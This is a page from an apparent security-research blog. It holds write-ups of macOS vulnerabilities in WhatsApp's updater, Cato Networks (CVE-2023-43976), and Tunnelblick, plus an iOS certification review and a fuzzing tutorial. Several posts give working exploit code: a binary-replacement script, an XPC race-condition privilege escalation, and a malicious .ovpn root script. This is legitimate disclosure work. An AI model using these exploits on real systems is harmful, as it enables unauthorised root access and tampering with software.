
    <!DOCTYPE html>
    <html lang="en">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    
        <title>NSEcho</title>
        <link rel="icon" type="image/x-icon" href="./assets/favicon.ico" />
    
    
        
            <link href="css/custom.css" rel="stylesheet"/>
        
    
    
    <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
    
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
    
    
        <link href="css/styles.css" rel="stylesheet" />
        <link href="css/prism.css" rel="stylesheet" />
    
</head>

    <body>
    <script>
        let posts = [
            
                {
                    "title": "Abusing WhatsApp update process on macOS",
                    "description": "Hijacking update process to plant our own binary",
                    "content": "\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eAbout a month ago, I have reported this to the WhatsApp team, and they refused to acknowledge this as a\nvulnerability, so I have waited for the new version to write a blog post about the issue.\u003c/p\u003e\n\n\u003cp\u003eBasically, during the update time no checks have been made to confirm whether the update is legit.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eI agree with their answer that an attacker could make something much worse, but still a fun issue to write about because\nthere may be other applications that are vulnerable to this and may be impact can be greater than the simply replacing binary like\nit is described here.\u003c/p\u003e\n\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\n\u003cp\u003eOnce the update is downloaded and ready to be installed, you will see the following window.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eUpdate that is ready to be installed can be found in the \u003ccode\u003e~/Library/Caches/net.whatsapp.WhatsApp/org.sparkle-project.Sparkle/Installation/RANDOM_ID/\u003c/code\u003e which contains\n\u003ccode\u003eWhatsApp.app\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eBy default, SIP (System Integrity Protection) prevents modifications inside of \u003ccode\u003e/Applications\u003c/code\u003e directory which can be seen on the image below, but with this \u0026ldquo;vulnerability\u0026rdquo; we can do that.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eEven though the SIP blocks this, we can still abuse the update process to plant our own binary in this case a\nsimple shell script that writes current user to \u003ccode\u003e/tmp/output\u003c/code\u003e file.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-python\"\u003e#!/usr/bin/env python3\nimport glob\nimport os\nimport stat\n\ncontent = \u0026quot;\u0026quot;\u0026quot;#!/bin/sh\n\nwhoami \u0026gt; /tmp/output\n\u0026quot;\u0026quot;\u0026quot;\n\ndef main():\n    # get the path to the directory\n    base_path = os.path.expanduser('~/Library/Caches/net.whatsapp.WhatsApp/org.sparkle-project.Sparkle/Installation/')\n    update_dir = glob.glob(base_path + '*/WhatsApp.app/Contents/MacOS', recursive=False)\n\n    if len(update_dir) != 1:\n        print(\u0026quot;Update not found\u0026quot;)\n        print(\u0026quot;Exiting...\u0026quot;)\n        exit()\n\n    # obtain the binary path\n    binary_path = os.path.join(update_dir[0], 'WhatsApp')\n\n    print(\u0026quot;Update found\u0026quot;)\n    print(\u0026quot;Replacing the file\u0026quot;)\n\n    # Remove real WhatsApp binary\n    os.remove(binary_path)\n\n    # Write the content\n    with open(binary_path, \u0026quot;w\u0026quot;) as f:\n        f.write(content)\n\n    # give executable permissions to planted binary\n    st = os.stat(binary_path)\n    os.chmod(binary_path, st.st_mode | stat.S_IEXEC)\n\nif __name__ == \u0026quot;__main__\u0026quot;:\n    main()\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAfter running it, we can confirm that the shell script is now there instead of the original binary.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eNow, the only thing left is to click on \u003ccode\u003eInstall and Relaunch\u003c/code\u003e or wait for the user to do it and on the new run, we can see\nthat our exploit is working correctly.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "wa.html"
                },
            
                {
                    "title": "CVE-2023-43976 - CatoNetworks macOS LPE",
                    "description": "Exploiting notorization race conditions",
                    "content": "\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eA couple of months ago, I have found Local Privilege Escalation vulnerability inside of CatoNetworks macOS application which is fixed in the version\n5.4.0. We will see how to exploit the simple race condition in order to achieve escalation of privileges to \u003cem\u003eroot\u003c/em\u003e user.\u003c/p\u003e\n\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eAfter examining \u003ccode\u003e~/Library/LaunchDaemons/com.catonetworks.mac.CatoClient.helper.plist\u003c/code\u003e we can see that the Mach service name is \u003ccode\u003ecom.catonetworks.mac.client.daemon\u003c/code\u003e and\nthe binary it runs is \u003ccode\u003e/Library/Application Support/CatoNetworks/com.catonetworks.mac.CatoClient.helper\u003c/code\u003e. We will take a note of the Mach service name because we will need\nit to communicate with the XPC service.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter we have obtained some limited information, we need to load the main binary in \u003cem\u003eHopper\u003c/em\u003e to analyze what is happening and to check whether there are any vulnerabilities.\u003c/p\u003e\n\n\u003cp\u003eSearching for \u003ccode\u003elistener:shouldAcceptNewConnection\u003c/code\u003e revealed that the exported protocol is \u003ccode\u003e_TtP38com_catonetworks_mac_CatoClient_helper15CommandProtocol_\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eRunning class dump showed that this protocol contains a single method \u003ccode\u003e- (void)installPackageAtPath:(NSString *)arg1 withCompletion:(void (^)(BOOL))arg2;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eBased on the name, we can conclude that we need to provide the path to the \u003ccode\u003e.pkg\u003c/code\u003e file and we can check whether we have succeeded or not based on the reply block.\u003c/p\u003e\n\n\u003cp\u003eIf we now search for implementation of this method, we can see that it calls function \u003ccode\u003esub_100002b7c\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eAnalyzing the \u003ccode\u003esub_100002b7c\u003c/code\u003e function, we can see that it checks whether \u003ccode\u003esub_1000027b0\u003c/code\u003e returned successfully, followed by creation of \u003ccode\u003eNSTask\u003c/code\u003e (to run programs).\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eNear the end of the function, there is another check which confirms whether probably the output of the run NSTask contains \u003ccode\u003e\\norigin=Developer ID Installer: Cato Networks Ltd (CKGSB8CH43)\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe will now create a minimal objc code to communicate with the service, and we will examine the arguments passed to \u003ccode\u003e-[NSTask setLaunchPath:]\u003c/code\u003e and \u003ccode\u003e-[NSTask setArguments:]\u003c/code\u003e methods with debugger (lldb).\u003c/p\u003e\n\n\u003cp\u003eThe objc code:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-objc\"\u003e// gcc cato.m -o cato -framework Foundation\n#import \u0026lt;Foundation/Foundation.h\u0026gt;\n\nstatic NSString * serviceName = @\u0026quot;com.catonetworks.mac.client.daemon\u0026quot;;\n\n@protocol _TtP38com_catonetworks_mac_CatoClient_helper15CommandProtocol_\n- (void)installPackageAtPath:(NSString *)arg1 withCompletion:(void (^)(BOOL))arg2;\n@end\n\nint main(int argc, const char **argv) {\n    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:4096];\n\n    [conn setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(_TtP38com_catonetworks_mac_CatoClient_helper15CommandProtocol_)]];\n    [conn resume];\n\n    id obj = [conn remoteObjectProxyWithErrorHandler:^(NSError * error) {\n           NSLog(@\u0026quot;Error: %@\u0026quot;, error);\n    }];\n\n    NSString * pkgPath = [NSString stringWithCString:argv[1] encoding:NSASCIIStringEncoding];\n\n    [obj installPackageAtPath:pkgPath withCompletion:^(BOOL succeeded) {\n        if (succeeded) {\n            NSLog(@\u0026quot;Exploit succeeded; check /tmp/himynameis\u0026quot;);\n        } else {\n            NSLog(@\u0026quot;Exploit failed; please try again\u0026quot;);\n        }\n    }];\n\n    dispatch_main();\n    return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWhile inside of \u003ccode\u003elldb\u003c/code\u003e we want to set the breakpoints and examine the arguments. Compiling the above code and running it as \u003ccode\u003e./cato nsecho\u003c/code\u003e gives the following\ninside of lldb.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eFrom the lldb output we can conclude that the service is calling \u003ccode\u003e/usr/sbin/spctl\u003c/code\u003e with the arguments \u003ccode\u003e-a -vvv -t install PACKAGE_PATH_WE_PROVIDED\u003c/code\u003e. \u003ccode\u003espctl\u003c/code\u003e is used to check notorization on the pkg files.\u003c/p\u003e\n\n\u003cp\u003eRunning the exact command on the legitimate CatoNetworks package returns the output which contains the string we found earlier (\u003ccode\u003e\\norigin=Developer ID Installer: Cato Networks Ltd (CKGSB8CH43)\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eSo far we now the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eServices uses \u003ccode\u003e_TtP38com_catonetworks_mac_CatoClient_helper15CommandProtocol_\u003c/code\u003e protocol\u003c/li\u003e\n\u003cli\u003eWe need to call \u003ccode\u003einstallPackageAtPath:pkgPath withCompletion:\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eService checks whether the app is notorized by the Cato using \u003ccode\u003espctl\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eGets installed if the previous check was successful\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIt seems that there is no way to exploit it, but after running spctl, I have noticed that it doesn\u0026rsquo;t return immediately, it takes a couple of milliseconds, meaning that we have\npotential race condition here.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eTo exploit this, we need to do the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eRun the exploit, providing the path to the legitimate Cato pkg file\u003c/li\u003e\n\u003cli\u003eWait a bit\u003c/li\u003e\n\u003cli\u003eReplace the legitimate Cato pkg file with the malicious one\u003c/li\u003e\n\u003cli\u003eLocal Privilege Escalation\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI will just add a simple command in the \u003ccode\u003epostinstall\u003c/code\u003e scripts which writes the current user to \u003ccode\u003e/tmp/himynameis\u003c/code\u003e file.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eThe exploit bash script:\u003c/em\u003e\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e#!/bin/bash\n\nORIGINAL=/Users/demon/Downloads/CatoClient-2.pkg\nFAKE=/Users/demon/Downloads/exploit.pkg\nTEMP=/tmp/expl.pkg\n\nwhile [ true ]\ndo\n    cp \u0026quot;${ORIGINAL}\u0026quot; \u0026quot;${TEMP}\u0026quot;\n\n    ./cato \u0026quot;${TEMP}\u0026quot; \u0026amp;\n    sleep 0.1\n    cp \u0026quot;${FAKE}\u0026quot; \u0026quot;${TEMP}\u0026quot;\n    sleep 4\n    stat /tmp/himynameis \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; exit 0\ndone\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "cve_2023_43976.html"
                },
            
                {
                    "title": "Certified iOS Security Engineer",
                    "description": "Review of the Certified iOS Security Engineer certification",
                    "content": "\u003ch1 id=\"background-and-preparation\"\u003eBackground and preparation\u003c/h1\u003e\n\n\u003cp\u003eA couple of days ago I have obtained \u003ca href=\"https://8ksec.io/cise/\"\u003eCISE\u003c/a\u003e (Certified iOS Security Engineer) from \u003ca href=\"https://8ksec.io\"\u003e8ksec\u003c/a\u003e. As I am a penetration tester and the person who is interested in iOS and macOS security, this was really nice exam to test my knowledge about it. I did not take any specific preparation besides the work I do daily which is pen testing iOS applications and learning about its internals.\u003c/p\u003e\n\n\u003cp\u003eThe exam will prove that you have the knowledge about the iOS applications, filesystem and different attack vectors. You will have to utilise the static and dynamic analysis using tools such as IDA Pro, Hopper, radare2, Frida, etc. There are no any specific prerequisites for the exam, but you will be in much better position if you spend some time penetration testing or generally doing any kind of iOS based research. This certificate is an intermediate level so you can approximately know what to expect.\u003c/p\u003e\n\n\u003ch1 id=\"the-exam\"\u003eThe exam\u003c/h1\u003e\n\n\u003cp\u003eFor the exam, you get 24 hours to finish it. It consists of multiple iOS applications that you have to attack, but this may not always be the case because from the description of the exam you can also get some services to attack, such as XPC services.\u003c/p\u003e\n\n\u003cp\u003eFor the exam, you get applications/services installed on the Corellium labs and the access to it and the exam objectives are provided to you at the time of the exam start. This was the first time that I have used Corellium labs so it was pretty nice to get my hands on it.\u003c/p\u003e\n\n\u003cp\u003eAfter you are logged in, you will start with the usual reconnaissance that starts from the static analysis, such as utilizing Hopper, examining the app structure in the case if you are dealing with application instead of service, dumping the strings, etc.\u003c/p\u003e\n\n\u003cp\u003eSometimes there may not be anything interesting during the static analysis, so you will have to start with dynamic analysis. For the dynamic analysis, the Frida is the tool you will use mostly. I had to bypass anti-debug and anti-Frida in order to do dynamic analysis properly. After you have bypassed these methods, you will need to find other vulnerabilities and the goal is to find them as much as you can.\u003c/p\u003e\n\n\u003cp\u003eAfter you are done with the exam, you write the report with all your findings and a couple of days later you will be notified about the results.\u003c/p\u003e\n\n\u003ch1 id=\"conclusion\"\u003eConclusion\u003c/h1\u003e\n\n\u003cp\u003eOverall, the exam was pretty nice and anyone with some level of experience with iOS should be able to pass the exam. I would suggest this exam to anyone interested in iOS as this will be some kind of confirmation for you knowledge.\u003c/p\u003e\n\n\u003ch1 id=\"resources\"\u003eResources\u003c/h1\u003e\n\n\u003cp\u003eHere are a couple of resources where you can learn more about the things that will be required in the exam.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://frida.re/docs/javascript-api/\"\u003ehttps://frida.re/docs/javascript-api/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/advanced-frida-usage-part-1-ios-encryption-libraries-8ksec-blogs/\"\u003ehttps://8ksec.io/advanced-frida-usage-part-1-ios-encryption-libraries-8ksec-blogs/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/advanced-frida-usage-part-2-analyzing-signal-and-telegram-messages-on-ios/\"\u003ehttps://8ksec.io/advanced-frida-usage-part-2-analyzing-signal-and-telegram-messages-on-ios/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/advanced-frida-usage-part-3-inspecting-ios-xpc-calls/\"\u003ehttps://8ksec.io/advanced-frida-usage-part-3-inspecting-ios-xpc-calls/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/advanced-frida-usage-part-4-sniffing-location-data-from-locationd-in-ios/\"\u003ehttps://8ksec.io/advanced-frida-usage-part-4-sniffing-location-data-from-locationd-in-ios/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/arm64-reversing-and-exploitation-part-1-arm-instruction-set-simple-heap-overflow/\"\u003ehttps://8ksec.io/arm64-reversing-and-exploitation-part-1-arm-instruction-set-simple-heap-overflow/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/ios-deeplink-attacks-part-1-introduction-8ksec-blogs/\"\u003ehttps://8ksec.io/ios-deeplink-attacks-part-1-introduction-8ksec-blogs/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://8ksec.io/ios-deep-link-attacks-part-2-exploitation-8ksec-blogs/\"\u003ehttps://8ksec.io/ios-deep-link-attacks-part-2-exploitation-8ksec-blogs/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://codeshare.frida.re/\"\u003ehttps://codeshare.frida.re/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://dhiyaneshgeek.github.io/mobile/security/2021/12/25/hopper-disassembler/\"\u003ehttps://dhiyaneshgeek.github.io/mobile/security/2021/12/25/hopper-disassembler/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://payatu.com/blog/runtime-manipulation-with-lldb/\"\u003ehttps://payatu.com/blog/runtime-manipulation-with-lldb/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://philkeeble.com/ios/reverse-engineering/iOS-Anti-Anti-Hooking/\"\u003ehttps://philkeeble.com/ios/reverse-engineering/iOS-Anti-Anti-Hooking/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eAnd of course my own blog that contains a couple of useful iOS related blog posts\u003c/li\u003e\n\u003c/ul\u003e\n",
                    "name": "cise.html"
                },
            
                {
                    "title": "Fuzz iOS URL schemes with furlzz",
                    "description": "Crashing Bear app with simple fuzzing",
                    "content": "\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eToday we will cover the tool I have created, \u003ca href=\"https://github.com/nsecho/furlzz\"\u003efurlzz\u003c/a\u003e which is an iOS URL scheme fuzzer.\nWe will go over how to set up and actually start fuzzing. This will be done on the Bear app 2.0.10 which had a simple bug\nwhich caused the application to crash.\u003c/p\u003e\n\n\u003ch2 id=\"tracing-urls-using-frida-trace\"\u003eTracing URLs using frida-trace\u003c/h2\u003e\n\n\u003cp\u003eThe first step is we need to determine how the application actually opens the URLs, we can do that\nwith \u003ccode\u003efrida-trace\u003c/code\u003e. We need some legitimate URL which will be opened inside the application and once we load\nthat URL we will take a look at frida-trace output to determine which method is used.\u003c/p\u003e\n\n\u003cp\u003eRun \u003ccode\u003efrida-trace -U Bear -m \u0026quot;*[* *openURL*]\u0026quot;\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can see that the URLs are opened using \u003ccode\u003escene:openURLContexts\u003c/code\u003e and based on the \u003ccode\u003efurlzz\u003c/code\u003e, that is the\nmethod of \u003ccode\u003escene_context\u003c/code\u003e (\u003ccode\u003e-m\u003c/code\u003e flag). We can also see that the name of the delegate is \u003ccode\u003eBear.SFDefaultSceneDelegate\u003c/code\u003e (\u003ccode\u003e-d\u003c/code\u003e flag).\u003c/p\u003e\n\n\u003cp\u003eWe need to determine one more thing before we can start fuzzing, that is the name of the \u003cem\u003escene\u003c/em\u003e class. We can do that\nby editing handler file that the Frida has created for that specific method.\u003c/p\u003e\n\n\u003cp\u003eType the following to edit the file.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ vim __handlers__/Bear.SFDefaultSceneDelegate/scene_openURLContexts_.js`\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eOnce the file is opened, we will convert \u003ccode\u003eargs[2]\u003c/code\u003e to \u003ccode\u003eObjC.Object\u003c/code\u003e followed by printing its \u003ccode\u003edescription()\u003c/code\u003e and converting it to string\nby calling \u003ccode\u003etoString()\u003c/code\u003e and that will be enough to see all the information that we need.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eIf we now open the URL, we would see that the name of class for \u003ccode\u003escene\u003c/code\u003e is \u003ccode\u003eSFDefaultScene\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch1 id=\"fuzzing\"\u003eFuzzing\u003c/h1\u003e\n\n\u003cp\u003eBear supports a couple of URL schemes, we can see whole list of them \u003ca href=\"https://bear.app/faq/x-callback-url-scheme-documentation/\"\u003ehere\u003c/a\u003e.\nThe one we will use is \u003ccode\u003ebear://x-callback-url/search?term=nemo\u0026amp;tag=movies\u003c/code\u003e. We will ignore that tag and just focus on \u003ccode\u003eterm\u003c/code\u003e parameter.\u003c/p\u003e\n\n\u003cp\u003eThe only step that is left to create the directory for our inputs and create some of them.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ mkdir bear_input\n$ echo -n 'furlzz' \u0026gt; bear_input/1\n$ echo -n 'fuzzing' \u0026gt; bear_input/2\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eTo recap, we need to pass the following to \u003ccode\u003efurlzz\u003c/code\u003e:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eapplication =\u0026gt; \u003ccode\u003eBear\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ebase URL =\u0026gt; \u003ccode\u003ebear://x-callback-url/search?term=FUZZ\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003edelegate =\u0026gt; \u003ccode\u003eBear.SFDefaultSceneDelegate\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003escene =\u0026gt; \u003ccode\u003eSFDefaultScene\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003emethod =\u0026gt; \u003ccode\u003escene_context\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003efunction to post-process =\u0026gt; \u003ccode\u003eurl\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003einput dir =\u0026gt; \u003ccode\u003ebear_input\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe full command is \u003ccode\u003e./furlzz fuzz -a Bear -b \u0026quot;bear://x-callback-url/search?term=FUZZ\u0026quot; -f url -i bear_input/ -t1 -m scene_context -d Bear.SFDefaultSceneDelegate -s SFDefaultScene\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can now examine the URL that caused the crash, additionally when the crash occurs session file is written\nso you can easily replay the crash.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eTo replay the crash, we just call \u003ccode\u003efurlzz crash\u003c/code\u003e with the session and crash file.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eThis bug got fixed in version 2.0.11.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "furlzz_fuzzing_bear.html"
                },
            
                {
                    "title": "Tunnelblick Local Privilege Escalation",
                    "description": "Abusing .ovpn files to gain privilege escalation",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#analysis\"\u003eAnalysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#references\"\u003eReferences\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eAny time I have to connect to some VPN using \u003ccode\u003e.ovpn\u003c/code\u003e file, I am using \u003ca href=\"#\"\u003eTunnelblick\u003c/a\u003e. Tunnelblick\nallows installation of \u003ccode\u003e.ovpn\u003c/code\u003e files using simple drag and drop method and it works great.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability is affecting Tunnelblick versions 3.8.8b and 4.0.0beta01 through 4.0.0beta05.\u003c/p\u003e\n\n\u003cp\u003eHowever, I was wondering whether it is possible to execute some commands as \u003ccode\u003eroot\u003c/code\u003e user because working with\nVPN requires root privileges.\u003c/p\u003e\n\n\u003cp\u003eAfter googling, I have found this \u003ca href=\"https://unix.stackexchange.com/questions/398036/running-a-command-after-my-openvpn-client-connects\"\u003elink\u003c/a\u003e which\nsays that we can indeed call our own scripts or binaries using something like:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003escript-security 2\nup /path/to/script.sh\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIf we can import the \u003cem\u003emalicious\u003c/em\u003e ovpn file, we could achieve privilege escalation as that script\nwould be run as root user.\u003c/p\u003e\n\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eFor the script to execute once the VPN connection is established we will use the following script\nsaved at \u003ccode\u003e/tmp/script.sh\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e#!/bin/bash\n\nwhoami \u0026gt; /tmp/tblk_output\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLets give the script executable permissions, so that it can be run freely (\u003ccode\u003echmod +x /tmp/script.sh\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003eWe also need some ovpn file and once we do have one, just append the following at the end of the file.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003escript-security 2\nup /tmp/script.sh\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eNow that we have malicious ovpn file crafted, where and how do we use it. If we try just to load it into the Tunnelblick\nwe would be presented with the window warning us that the file contains the code which will be run as root user.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eThis is too noisy, and we do not want this.\u003c/p\u003e\n\n\u003cp\u003eAfter poking around a bit with Tunnelblick I have noticed that it writes some logs to \u003ccode\u003e/tmp/tunnelblick-installer-log.txt\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eTaking a look at it, we can see that it is working with \u003ccode\u003e~/Library/Application Support/Tunnelblick/Configurations\u003c/code\u003e directory. After copying\n\u003ccode\u003eexploit.ovpn\u003c/code\u003e to this location, nothing happens. However, if restart the Tunnelblick, a new window is shown where\nTunnelblick is asking whether we would like to convert configuration (from \u003ccode\u003e.ovpn\u003c/code\u003e to \u003ccode\u003e.tblk\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eIf we take a look at that \u003cem\u003eConfigurations\u003c/em\u003e directory, we can see that new \u003ccode\u003eexploit.tblk\u003c/code\u003e directory is created. Inspecting that directory\nshows our \u003ccode\u003escript.sh\u003c/code\u003e inside of it, containing the original content of \u003ccode\u003e/tmp/script.sh\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eIf we now connect to this new VPN, our script will execute, and we can confirm that by checking output of \u003ccode\u003e/tmp/tblk_output\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd there you have it, we are \u003ccode\u003eroot\u003c/code\u003e user. Although, the user will be presented with the window to authenticate in order\nto convert the file, they usually are unaware what they are doing and will blindly enter their password without realizing that they are\ngiving root permissions to some third-party.\u003c/p\u003e\n",
                    "name": "tunnelblick_assisted_lpe.html"
                },
            
                {
                    "title": "Tunnelblick Arbitrary File Overwrite",
                    "description": "Using hardlinks to overwrite root owned files",
                    "content": "\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eFollowing the \u003ca href=\"./tunnelblick_assisted_lpe.html\"\u003eAssisted LPE\u003c/a\u003e vulnerability in \u003ca href=\"https://tunnelblick.net\"\u003eTunnelblick\u003c/a\u003e, I have decided to dig some more and discovered Arbitrary File Overwrite which allows non-root user to overwrite root-owned files. This vulnerability is the same as \u003ca href=\"./nomachine_afo.html\"\u003eNoMachine Arbitrary File Overwrite\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eTunnelblick writes logs to location \u003ccode\u003e/tmp/tunnelblick-installer-log.txt\u003c/code\u003e and this file is owned by root. If we can manage to to create file \u003ccode\u003e/tmp/tunnelblick-installer-log.txt\u003c/code\u003e which points to some root-wowned file, we can overwrite that file because the process that writes to this file is run as \u003ccode\u003eroot\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eTo confirm that the file is indeed owned by root, we will issue \u003ccode\u003els -l\u003c/code\u003e command on the file.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003ch1 id=\"exploit\"\u003eExploit\u003c/h1\u003e\n\n\u003cp\u003eFor the demonstration purposes, let\u0026rsquo;s say that we know that the Tunnelblick is installed, but not started (file \u003ccode\u003e/tmp/tunnelblick-installer-log.txt\u003c/code\u003e is not present).\u003c/p\u003e\n\n\u003cp\u003eTo exploit it, we will create a file /Library/secret as a root user and we will give read/write permissions to that file to the root user.\u003c/p\u003e\n\n\u003cp\u003eAfter that, we will create hardlink named \u003ccode\u003e/tmp/tunnelblick-installer-log.txt\u003c/code\u003e that points to that \u003ccode\u003e/Library/secret\u003c/code\u003e file and once the write to the log file has been triggered, file that is pointed to by the hardlink(\u003ccode\u003e/Library/secret\u003c/code\u003e) will be overwritten.\u003c/p\u003e\n\n\u003cp\u003eWe can see that the contents of the \u003ccode\u003e/Library/secret\u003c/code\u003e and \u003ccode\u003e/tmp/tunnelblick-installer-log.txt\u003c/code\u003e are the same.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n",
                    "name": "tunnelblick_file_overwrite.html"
                },
            
                {
                    "title": "CVE-2023-39107 - NoMachine Arbitrary File Overwrite",
